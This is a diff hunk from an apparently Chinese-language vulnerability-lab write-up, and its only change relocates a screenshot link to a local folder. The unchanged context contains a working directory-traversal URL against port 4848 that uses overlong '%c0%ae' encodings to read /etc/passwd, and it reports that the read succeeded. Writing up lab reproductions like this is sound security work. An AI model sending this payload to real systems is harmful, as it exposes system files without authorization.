@@ -21,7 +21,7 @@ docker-compose up -d
 
 访问`https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`，发现已成功读取`/etc/passwd`内容：
 
-![image-20220223221248955](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202232212069.png)
+![image-20220223221248955](./images/202202232212069.png)
 
 ## 额外说明
 
